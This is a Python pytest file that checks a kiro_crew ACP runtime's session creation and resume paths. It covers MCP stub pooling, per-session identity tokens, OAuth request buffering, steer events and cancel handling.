        names = [e["name"] for e in params["mcpServers"]]
        assert (server in names) is (not disabled), names


class TestAcpRuntimeLoadSession:
    """load_session() must mirror AcpClient._initialize_session's resume path:
    issue session/load DIRECTLY (no session/new first) under the ORIGINAL sid,
    with the same cwd + mcpServers (pooled stubs and managed direct tools)
    + _kiro.dev/session_file _meta. The double-session
    drift it replaces produced stopReason='refusal'."""

    @pytest.mark.asyncio
    async def test_load_session_sends_direct_session_load_params(self, monkeypatch):
        rt, _, _ = _make_runtime()
        rt._can_load_session = True

        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            # session/load echoes "modes"; set_mode echoes nothing meaningful.
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)

        handle = await rt.load_session(
            "/home/u/.kiro/sessions/cli/sid-123.json",
            "sid-123",
            cwd="/work",
            agent="kirocrew",
        )

        # No session/new was issued — the first RPC is session/load itself.
        methods = [m for m, _ in sent]
        assert METHOD_SESSION_NEW not in methods
        assert methods[0] == METHOD_SESSION_LOAD

        load_params = sent[0][1]
        servers = load_params["mcpServers"]
        assert [entry["name"] for entry in servers] == [
            "kirocrew-core",
            "kirocrew-cron",
            "kirocrew-guide",
            "kirocrew-mate",
        ]
        assert all(_identity_tokens(servers))
        assert load_params == {
            "sessionId": "sid-123",
            "cwd": "/work",
            "mcpServers": servers,
            "_meta": {"_kiro.dev/session_file": "/home/u/.kiro/sessions/cli/sid-123.json"},
        }
        # Handle adopts the ORIGINAL sid and its queue is registered.
        assert handle.session_id == "sid-123"
        assert "sid-123" in rt._session_queues
        # set_mode ran for the resumed session (mirrors AcpClient step 4).
        assert METHOD_SET_MODE in methods

    @pytest.mark.asyncio
    async def test_load_session_moves_a_resumed_session_off_an_unserved_default(self, monkeypatch):
        """The resume path is the second half of the served-default check.

        session/load echoes ``currentModelId`` like session/new does, and a
        session persisted before the served list changed can come back on a
        default the account does not serve. load_session must run
        ``ensure_served_default`` after storing the response, exactly as
        create_session does, so the first prompt after a resume cannot fail with
        "no access to model".
        """
        from kiro_crew.acp.types import ACP_BACKEND_KIRO, METHOD_SET_MODEL

        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        rt._acp_backend = ACP_BACKEND_KIRO

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_LOAD:
                return {
                    "modes": {"currentModeId": "kirocrew"},
                    "models": {
                        "currentModelId": "auto",
                        "availableModels": [{"modelId": "gpt-5.6-sol"}, {"modelId": "glm-5"}],
                    },
                }
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        # set_model goes through the routed send and waits for the adapter's reply.
        routed = _replying_send(lambda params: rt._session_queues[params["sessionId"]])
        monkeypatch.setattr(rt, "send_request", routed)

        handle = await rt.load_session("/f.json", "sid-resume", agent="kirocrew")

        set_model_calls = [c for c in routed.await_args_list if c.args[0] == METHOD_SET_MODEL]
        assert len(set_model_calls) == 1, routed.await_args_list
        assert set_model_calls[0].args[1] == {"sessionId": "sid-resume", "modelId": "gpt-5.6-sol"}
        assert handle.served_model == "gpt-5.6-sol"
        # The intent is untouched: the resumed session still INHERITS.
        assert handle.model == ""

    @pytest.mark.asyncio
    async def test_load_session_raises_when_capability_absent(self):
        rt, _, _ = _make_runtime()
        rt._can_load_session = False
        with pytest.raises(AcpRuntimeError):
            await rt.load_session("/f.json", "sid-x")
        # No queue leaked on the guard path.
        assert "sid-x" not in rt._session_queues

    @pytest.mark.asyncio
    async def test_load_session_without_modes_raises_and_unregisters(self, monkeypatch):
        rt, _, _ = _make_runtime()
        rt._can_load_session = True

        async def _fake_send(method, params, timeout=None):
            return {}  # no "modes" → load did not actually restore state

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)

        with pytest.raises(AcpRuntimeError):
            await rt.load_session("/f.json", "sid-y", agent="kirocrew")
        # The queue registered before the send must be cleaned up on failure.
        assert "sid-y" not in rt._session_queues

    @pytest.mark.asyncio
    async def test_load_session_reinjects_the_kas_agent_definition(self, monkeypatch):
        """Resume must re-send the agent, for the same reason session/new sends it.

        KAS registers client agents PER SESSION and has no ``--agent`` flag, so a
        resumed session that is not handed them again advertises only the modes it
        can find on disk — and that set is not a superset of what session/new had,
        because KAS skips an agent profile written for kiro-cli. Omitting this made
        the requested mode genuinely absent on resume, and the mode guard then
        refused the load rather than silently running the backend default.
        """
        from kiro_crew.acp._dispatch import build_session_new_params

        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            from kiro_crew.acp.harness import SessionExtras

            return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
        rt._acp_backend = ACP_BACKEND_KAS

        await rt.load_session("", "sid-kas", cwd="/work", agent="kirocrew")

        load_params = sent[0][1]
        assert load_params["_meta"]["kiro"]["customAgents"] == [
            {"id": "kirocrew", "prompt": "p", "tools": []}
        ]
        # Same envelope as session/new, because both go through one builder. Two
        # hand-built copies of this nesting would be free to drift, and a resumed
        # session that got a subtly different shape would fail the same way the
        # missing injection did: mode absent, load refused.
        assert (
            load_params["_meta"]["kiro"]
            == build_session_new_params(
                "/work", kas_custom_agents=[{"id": "kirocrew", "prompt": "p", "tools": []}]
            )["_meta"]["kiro"]
        )

    @pytest.mark.asyncio
    async def test_the_kas_resume_report_reads_the_hoisted_array(self, monkeypatch):
        """The session report must name the array the resume SENT, post-hoist.

        ``hoist_managed_servers`` moves a managed server out of the agent definition
        and into the session array, so on KAS the array the wire carries is not the
        one the roster was bound from. The report and the stall diagnostic read that
        binding, so a resume that re-assigned only the request param would describe
        servers it did not send -- the pre-hoist roster -- while the session ran on
        the hoisted one.
        """
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            from kiro_crew.acp.harness import SessionExtras

            return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])

        def _hoist(agents, agent, servers, **_kw):
            # The shape the real hoist produces: a managed server appears on the
            # array that was not in the roster the caller passed in.
            return agents, list(servers) + [{"name": "hoisted", "command": "/bin/h"}]

        import kiro_crew.acp.runtime as runtime_mod

        reported: list[list] = []
        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
        monkeypatch.setattr(runtime_mod, "hoist_managed_servers", _hoist)
        monkeypatch.setattr(
            rt,
            "_guard_unresolved_mcp_refs",
            lambda handle, spec, agent, wire: reported.append(wire),
        )
        rt._acp_backend = ACP_BACKEND_KAS

        await rt.load_session("", "sid-hoist", cwd="/work", agent="kirocrew")

        load_params = sent[0][1]
        names = [e.get("name") for e in load_params["mcpServers"]]
        assert "hoisted" in names, "the hoisted server never reached the wire"
        assert reported, "the wire roster was never handed to the report/guard"
        assert [e.get("name") for e in reported[-1]] == names, (
            "the report reads a different array than the resume sent; rebind "
            "wire_servers at the hoist rather than only load_params['mcpServers']"
        )

    @pytest.mark.asyncio
    @pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
    async def test_kas_hoisted_control_plane_carries_the_session_token(self, monkeypatch, resume):
        """On KAS the managed servers reach the wire through the hoist, token included.

        The runtime stamps the per-session token onto its array BEFORE
        ``hoist_managed_servers`` runs, and on KAS that array is empty: every
        managed server arrives through the hoist. A hoisted ``kirocrew-core``
        without the token reads its tool policy unattested and refuses every call
        as ``identity_unattested`` -- memory, logs, spawn_run -- on every session.
        """
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-kas-new"}
            return {}

        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            from kiro_crew.acp.harness import SessionExtras

            return SessionExtras(
                custom_agents=[
                    {
                        "id": agent,
                        "prompt": "p",
                        "tools": ["@kirocrew-core", "@external"],
                        "mcpServers": {
                            "kirocrew-core": {
                                "command": "kc",
                                "args": ["mcp-core"],
                                "env": {"KIROCREW_SESSION_KEY": session_key},
                            },
                            "external": {"command": "ext"},
                        },
                    }
                ]
            )

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
        # Readiness is its own concern (see the kas_readiness_wire tests); this one
        # is about what the request carried, so the wait returns at once.
        monkeypatch.setattr(AcpSessionHandle, "wait_mcp_ready", AsyncMock(return_value=None))
        rt._acp_backend = ACP_BACKEND_KAS

        if resume:
            handle = await rt.load_session(
                "", "sid-kas-load", cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
            )
            method = METHOD_SESSION_LOAD
        else:
            handle = await rt.create_session(
                cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
            )
            method = METHOD_SESSION_NEW
        params = next(p for m, p in sent if m == method)
        core = [e for e in params["mcpServers"] if e.get("name") == "kirocrew-core"]
        assert len(core) == 1, "kirocrew-core must travel in the session-level array"
        (token,) = _identity_tokens(core)
        assert token, "the hoisted kirocrew-core was launched without the session token"
        assert token == handle.stub_session_token, "the element must carry THIS session's token"
        # A third-party server stays in the agent block, and never gets the token.
        (agent_block,) = params["_meta"]["kiro"]["customAgents"]
        assert STUB_SESSION_TOKEN_ENV not in json.dumps(agent_block)

    @pytest.mark.asyncio
    async def test_load_session_keeps_the_transcript_path_alongside_the_agents(self, monkeypatch):
        """Merged, not assigned: a third _meta writer must not drop an earlier one.

        The two envelopes belong to different backends today (a transcript path is
        kiro-cli-only), so in practice they do not collide — which is exactly why a
        plain assignment would survive review and then lose a field later.
        """
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            from kiro_crew.acp.harness import SessionExtras

            return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
        rt._acp_backend = ACP_BACKEND_KAS

        await rt.load_session("/t.json", "sid-both", cwd="/work", agent="kirocrew")

        meta = sent[0][1]["_meta"]
        assert meta["_kiro.dev/session_file"] == "/t.json"
        assert "kiro" in meta

    @pytest.mark.asyncio
    async def test_the_kiro_resume_path_never_reaches_the_adapter(self, monkeypatch):
        """harness-parity H13: the kiro construction path must not change at all.

        Relying on ``_kas_custom_agents`` to answer ``None`` would leave the kiro
        resume awaiting an adapter coroutine — working, but changed, and free to
        grow a failure mode later. The backend guard is what makes the kiro path
        reach a comparison and stop, so this asserts the adapter is never called.
        """
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []
        calls: list[str] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            from kiro_crew.acp.harness import SessionExtras

            calls.append(agent)
            return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)

        await rt.load_session("/t.json", "sid-kiro", cwd="/work", agent="kirocrew")

        assert calls == []
        assert sent[0][1]["_meta"] == {"_kiro.dev/session_file": "/t.json"}

    @pytest.mark.asyncio
    async def test_load_session_params_match_acp_client(self, monkeypatch):
        """Drift guard: the kiro (non-claude) session/load payload built here
        must equal the one AcpClient._initialize_session builds, so the two
        resume paths never diverge. Compares the field set explicitly."""
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        captured: dict = {}

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_LOAD:
                captured.update(params)
                return {"modes": {}, "models": []}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        await rt.load_session("/k/sid.json", "sid", cwd="/w", agent="kirocrew")

        # Mirror of AcpClient's kiro-branch load_params (client.py step 2).
        # Direct managed tools retain per-session caller attribution on resume;
        # the pooled case is covered by test_load_session_redeclares_pooled_stubs.
        servers = captured["mcpServers"]
        assert [entry["name"] for entry in servers] == [
            "kirocrew-core",
            "kirocrew-cron",
            "kirocrew-guide",
            "kirocrew-mate",
        ]
        assert all(_identity_tokens(servers))
        expected = {
            "sessionId": "sid",
            "cwd": "/w",
            "mcpServers": servers,
            "_meta": {"_kiro.dev/session_file": "/k/sid.json"},
        }
        assert captured == expected

    @pytest.mark.asyncio
    async def test_load_session_unregisters_queue_when_set_mode_fails(self, monkeypatch):
        """A set_mode failure AFTER the queue is registered must TERMINATE the
        resumed session on kiro-cli (session/load already restored it there, so
        a plain unregister leaks it) and drop the local queue, so the caller's
        create_session() fallback doesn't leave the reader routing late
        transcript-replay frames to an abandoned resume_sid queue."""
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        methods: list[str] = []

        async def _fake_send(method, params, timeout=None):
            methods.append(method)
            if method == METHOD_SESSION_LOAD:
                return {"modes": {}, "models": []}  # load succeeds, queue registers
            if method == METHOD_SET_MODE:
                raise AcpRuntimeError("set_mode boom")
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)

        with pytest.raises(AcpRuntimeError):
            await rt.load_session("/k/sid.json", "sid-z", cwd="/w", agent="kirocrew")
        assert METHOD_SESSION_TERMINATE in methods
        assert "sid-z" not in rt._session_queues

    @pytest.mark.asyncio
    async def test_load_session_redeclares_pooled_stubs(self, tmp_path, monkeypatch):
        """A resumed session must re-declare the pooled broker
        stubs. session/load re-initializes the session's MCP servers, so a []
        sent here applies: the stubs stop shadowing the
        agent spec's same-named entries and kiro-cli spawns its own copy of
        every pooled server, silently un-pooling the session for life.

        Asserts on the EMITTED mcpServers of both requests: load_session must
        carry exactly the entries create_session injects for the same agent +
        overlay. Mutating the fix back to [] fails the first assert."""
        from kiro_crew.mcp_gateway.rewriter import _WRAPPER_MARKER

        overlay = tmp_path / "agents"
        overlay.mkdir()
        (overlay / "kirocrew.json").write_text(
            json.dumps(
                {
                    "name": "kirocrew",
                    "mcpServers": {
                        "builder-mcp": {
                            _WRAPPER_MARKER: True,
                            "command": "/data/mcp-gateway/stubs/mc-mcp-stub-wrapper.sh",
                            "args": ["--target-command=builder-mcp"],
                            "env": {},
                        }
                    },
                }
            ),
            encoding="utf-8",
        )
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        rt._mcp_gateway_overlay = str(overlay)

        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {}, "models": []}
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-new"}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)

        await rt.load_session("/k/sid.json", "sid-r", cwd="/w", agent="kirocrew")
        load_params = next(p for m, p in sent if m == METHOD_SESSION_LOAD)
        assert [e["name"] for e in load_params["mcpServers"]] == [
            "builder-mcp",
            "kirocrew-core",
            "kirocrew-cron",
            "kirocrew-guide",
            "kirocrew-mate",
        ]

        # Parity with create_session for the same agent + overlay: the two
        # injection paths must never diverge.
        #
        # The per-session token's VALUE is the one part that legitimately differs:
        # each session start mints its own (``_own_stub_session``) and these are two
        # different sessions. So the value is normalised and everything else --
        # ``command``, ``args``, every other env pair -- is compared byte-for-byte,
        # because the parity this guards is the stub SET, and re-declaring a
        # different one is what silently un-pools a resumed session.
        #
        # PRESENCE is asserted separately and is not part of the normalisation: a
        # comparison that dropped the pair from both sides would pass just as
        # happily if one path stopped carrying a token at all, which is the
        # regression this file is the only guard for.
        await rt.create_session(cwd="/w", agent="kirocrew")
        new_params = next(p for m, p in sent if m == METHOD_SESSION_NEW)
        load_tokens = _identity_tokens(load_params["mcpServers"])
        new_tokens = _identity_tokens(new_params["mcpServers"])
        assert all(load_tokens) and all(new_tokens), (
            "every re-declared element must carry this session's identity token; "
            f"load={load_tokens} new={new_tokens}"
        )
        assert load_tokens != new_tokens, "two different sessions must not share a token"
        assert _without_identity_env(load_params["mcpServers"]) == _without_identity_env(
            new_params["mcpServers"]
        )

    @pytest.mark.asyncio
    async def test_load_session_resolves_stubs_off_the_event_loop(self, monkeypatch):
        """The overlay lookup stats and reads files; like create_session it must
        run via asyncio.to_thread, not on the loop thread."""
        import threading

        import kiro_crew.acp.runtime as rt_mod

        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        rt._mcp_gateway_overlay = "/nonexistent-overlay"

        loop_thread = threading.current_thread()
        seen: list[threading.Thread] = []

        def _recording_pooled(overlay_dir, agent, channel_id=None, **_kw):
            # ``**_kw`` so the double keeps mirroring the real signature, which
            # takes the session's checkout as ``work_dir``.
            seen.append(threading.current_thread())
            return []

        monkeypatch.setattr(rt_mod, "pooled_session_servers", _recording_pooled)

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_LOAD:
                return {"modes": {}, "models": []}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        await rt.load_session("/k/sid.json", "sid-t", cwd="/w", agent="kirocrew")

        assert seen, "load_session never consulted pooled_session_servers"
        assert all(t is not loop_thread for t in seen)

    def test_every_session_request_builder_consults_pooled_servers(self):
        """The stub injection lives at multiple call sites in
        two files, and a call site silently sending [] is the failure this guards.
        Enumerate every function that issues session/new or session/load and
        assert each one consults the pooled-stub resolution (either
        pooled_session_servers directly or the _pooled_mcp_servers hook), so a
        fourth builder — or a regression in an existing one — fails here
        instead of shipping another silent un-pooling path."""
        import ast
        import inspect

        import kiro_crew.acp.client as client_mod
        import kiro_crew.acp.runtime as rt_mod

        _SEND_FUNCS = {"_send_request", "_send_and_await"}
        # All THREE session-creating verbs. ``session/resume`` is the standard
        # alternative to ``session/load`` for an agent that keeps sessions without
        # implementing full loading, and a resumed session re-declares its whole MCP
        # surface exactly as a loaded one does -- so a builder sending it must consult
        # the pooled stubs for the same reason, and leaving it out would exempt the
        # newest restore path from this ratchet.
        _SESSION_METHODS = {
            "METHOD_SESSION_NEW",
            "METHOD_SESSION_LOAD",
            "METHOD_SESSION_RESUME",
        }

        # Every session-method constant one expression can evaluate to, so a builder
        # that CHOOSES its verb is read as naming both.
        def _method_names(node: ast.AST) -> set:
            if isinstance(node, ast.Name):
                return {node.id} & _SESSION_METHODS
            if isinstance(node, ast.IfExp):
                return _method_names(node.body) | _method_names(node.orelse)
            return set()

        def _builders(module) -> dict[str, str]:
            src = inspect.getsource(module)
            out: dict[str, str] = {}
            for node in ast.walk(ast.parse(src)):
                if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    continue
                # Locals bound to one of those constants, so ``restore_method = A if
                # ... else B`` followed by a send of ``restore_method`` is still seen.
                # Without this the scan sees only a constant named AT the call, and one
                # variable makes a builder invisible -- which is exactly the silent
                # un-pooling this ratchet exists to catch.
                aliases = set()
                for inner in ast.walk(node):
                    if not isinstance(inner, ast.Assign) or not _method_names(inner.value):
                        continue
                    for target in inner.targets:
                        if isinstance(target, ast.Name):
                            aliases.add(target.id)
                for call in ast.walk(node):
                    if not (
                        isinstance(call, ast.Call)
                        and isinstance(call.func, ast.Attribute)
                        and call.func.attr in _SEND_FUNCS
                        and call.args
                    ):
                        continue
                    first = call.args[0]
                    aliased = isinstance(first, ast.Name) and first.id in aliases
                    if _method_names(first) or aliased:
                        out[node.name] = ast.get_source_segment(src, node) or ""
                        break
            return out

        builders = {**_builders(rt_mod), **_builders(client_mod)}
        # Exempt: builders whose session exists only to read the session/new
        # response and is terminated before any prompt. Such a session never
        # calls a tool, so pooled broker stubs would add per-probe MCP boot
        # churn without pooling anything. Everything a REAL conversation runs
        # through must stay in the ratchet.
        _NEVER_PROMPTS = {"probe_advertised_models"}
        for name in _NEVER_PROMPTS:
            assert name in builders, f"{name} no longer issues session/new — remove its exemption"
            builders.pop(name)
        # The four known builders; a new one is included automatically.
        _EXPECTED = {
            "create_session",
            "load_session",
            "_new_session_following_substitution",
            "_initialize_session",
        }
        # Names what is MISSING first and the found set second, so a reader chasing
        # this failure looks up the name that is absent rather than one that is
        # present.
        assert _EXPECTED <= builders.keys(), (
            f"expected builders missing from scan: {sorted(_EXPECTED - builders.keys())} "
            f"(found: {sorted(builders)})"
        )
        for name, body in builders.items():
            assert "pooled_session_servers" in body or "_pooled_mcp_servers" in body, (
                f"{name} issues session/new or session/load but never consults "
                "the pooled broker stubs — it would un-pool its sessions (#3528)"
            )


@pytest.mark.asyncio
async def test_create_session_terminates_session_when_set_mode_fails(monkeypatch):
    """A set_mode failure AFTER session/new succeeded must TERMINATE the session
    on kiro-cli — session/new already created it in the shared process, so a
    plain local unregister would leak it there (RSS growth). terminate_session
    also unregisters the local queue, so the abandoned-queue routing is closed
    too. Mirrors the same cleanup load_session() performs."""
    rt, _, _ = _make_runtime()
    methods: list[str] = []

    async def _fake_send(method, params, timeout=None):
        methods.append(method)
        if method == METHOD_SESSION_NEW:
            return {"sessionId": "sid-new"}  # session/new succeeds → queue registers
        if method == METHOD_SET_MODE:
            raise AcpRuntimeError("set_mode boom")
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _fake_send)

    with pytest.raises(AcpRuntimeError):
        await rt.create_session(cwd="/w", agent="kirocrew")
    # kiro-cli was told to evict the just-created session, and the local queue
    # registered before set_mode is cleaned up on failure.
    assert METHOD_SESSION_TERMINATE in methods
    assert "sid-new" not in rt._session_queues


@pytest.mark.asyncio
async def test_create_session_registers_queue_on_success(monkeypatch):
    """Happy path: a successful create_session keeps the session queue
    registered so the returned handle receives its frames."""
    rt, _, _ = _make_runtime()

    async def _fake_send(method, params, timeout=None):
        if method == METHOD_SESSION_NEW:
            return {"sessionId": "sid-ok"}
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _fake_send)

    handle = await rt.create_session(cwd="/w", agent="kirocrew")
    assert handle.session_id == "sid-ok"
    assert "sid-ok" in rt._session_queues


@pytest.mark.asyncio
async def test_create_session_buffers_oauth_emitted_before_response():
    """OAuth emitted during session/new survives until the provider can drain it."""
    from kiro_crew.acp.session_provider import AcpSessionProvider

    rt, reader, _ = _make_runtime()
    reader_task = await _start_reader(rt)
    create_task = asyncio.create_task(rt.create_session(cwd="/w"))
    try:
        request_id = await _await_pending(rt)
        oauth_url = "https://mcp.linear.app/authorize?client_id=shared"
        _feed(
            reader,
            {
                "method": METHOD_MCP_OAUTH_REQUEST,
                "params": {
                    "sessionId": "sid-new",
                    "serverName": "linear",
                    "oauthUrl": oauth_url,
                },
            },
        )
        _feed(reader, {"id": request_id, "result": {"sessionId": "sid-new"}})

        handle = await await_until(create_task, what="the session being created")
        provider = AcpSessionProvider(handle, rt)
        assert provider.pop_pending_oauth_requests() == [
            {"serverName": "linear", "oauthUrl": oauth_url}
        ]
        assert provider.pop_pending_oauth_requests() == []
    finally:
        if not create_task.done():
            create_task.cancel()
        await _stop_reader(reader_task)


@pytest.mark.asyncio
async def test_failed_session_init_oauth_does_not_leak_to_reused_id():
    """A failed init cannot leave an approval URL for a later shared session."""
    rt, reader, _ = _make_runtime()
    reader_task = await _start_reader(rt)
    failed_task = asyncio.create_task(rt.create_session(cwd="/w"))
    fresh_task = None
    try:
        failed_request_id = await _await_pending(rt)
        _feed(
            reader,
            {
                "method": METHOD_MCP_OAUTH_REQUEST,
                "params": {
                    "sessionId": "sid-reused",
                    "serverName": "linear",
                    "oauthUrl": "https://mcp.linear.app/authorize?client_id=stale",
                },
            },
        )
        _feed(
            reader,
            {
                "id": failed_request_id,
                "error": {"code": -32603, "message": "session init failed"},
            },
        )
        with pytest.raises(AcpRuntimeError, match="session init failed"):
            await await_until(failed_task, what="the failed session start settling")
        assert not rt._pending_init_notifications

        fresh_task = asyncio.create_task(rt.create_session(cwd="/w"))
        fresh_request_id = await _await_pending(rt, exclude={failed_request_id})
        _feed(reader, {"id": fresh_request_id, "result": {"sessionId": "sid-reused"}})
        handle = await await_until(fresh_task, what="the fresh session being created")
        assert handle.pop_pending_oauth_requests() == []
    finally:
        for task in (failed_task, fresh_task):
            if task is not None and not task.done():
                task.cancel()
        await _stop_reader(reader_task)


# ── Drift-parity fixes (AcpRuntime ↔ AcpClient): #1-#4 + #5b ──


@pytest.mark.asyncio
async def test_steer_notifications_yield_steer_events():
    """steering_* session/update frames classify as "steer" and yield the
    EVENT_STEER_* events. Without a steer branch in classify_notification the
    shared demux path never surfaces mid-turn steer."""
    from kiro_crew.acp.types import (
        EVENT_STEER_CLEARED,
        EVENT_STEER_CONSUMED,
        EVENT_STEER_QUEUED,
    )

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events: list = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "steering_queued", "content": "please focus on X"},
                },
            },
        )
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "steering_consumed", "content": "focus on X"},
                },
            },
        )
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "steering_cleared"},
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")

        kinds = [e.kind for e in events]
        assert EVENT_STEER_QUEUED in kinds
        assert EVENT_STEER_CONSUMED in kinds
        assert EVENT_STEER_CLEARED in kinds
        queued = next(e for e in events if e.kind == EVENT_STEER_QUEUED)
        assert queued.text == "please focus on X"
        consumed = next(e for e in events if e.kind == EVENT_STEER_CONSUMED)
        assert consumed.text == "focus on X"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_tool_interrupted_marker_synthesizes_complete(monkeypatch):
    """#2: kiro-cli's security-filter marker (text-only, no `complete` response)
    must synthesize EVENT_COMPLETE so the turn does not hang until the 2h prompt
    timeout, and must emit the SEL audit. No prompt response is fed here — the
    turn MUST still terminate."""
    import kiro_crew.acp.session_handle as sh

    sel_mock = MagicMock()
    monkeypatch.setattr(sh, "sel", lambda: sel_mock)
    marker = "Tool uses were interrupted, waiting for the next user prompt"

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events: list = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=5.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        await asyncio.sleep(0.05)
        # Only the marker text chunk — NO {"id": req_id, "result": ...} response.
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "agent_message_chunk",
                        "content": {"type": "text", "text": marker},
                    },
                },
            },
        )
        # Must finish WITHOUT the turn response (the synthesized complete ends it).
        await await_until(driver, what="the driver finishing its turn")

        assert events[-1].kind == EVENT_COMPLETE
        assert handle._turn_done.is_set()
        sel_mock.log_tool_invocation.assert_called_once()
        _kwargs = sel_mock.log_tool_invocation.call_args.kwargs
        assert _kwargs["outcome"] == "denied"
        assert _kwargs["tool_name"] == "kiro_cli_security_filter"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_unresponsive_cancel_unblocks_without_killing_runtime():
    """#3: after cancel(), if kiro-cli never acks (no cancelled stopReason) within
    the grace budget, the dispatch loop synthesizes a terminal EVENT_COMPLETE so
    the caller unblocks — WITHOUT killing the shared runtime (send_notification is
    the only runtime call; no kill)."""
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    rt.kill = MagicMock()  # type: ignore[method-assign]  # must NOT be called
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events: list = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=5.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        await asyncio.sleep(0.05)
        await handle.cancel()
        # Backdate the cancel so the grace window has already elapsed.
        handle._cancel_ts = time.monotonic() - (handle._cancel_grace_secs + 1)
        # Wake the loop so it re-checks the cancel guard at the top of the while.
        _feed(reader, {"method": "_kiro.dev/metadata", "params": {"sessionId": "sA"}})
        await await_until(driver, what="the driver finishing its turn")

        assert events[-1].kind == EVENT_COMPLETE
        assert events[-1].stop_reason == "error: cancel unacked"
        assert handle._turn_done.is_set()
        rt.kill.assert_not_called()
    finally:
        await _stop_reader(task)


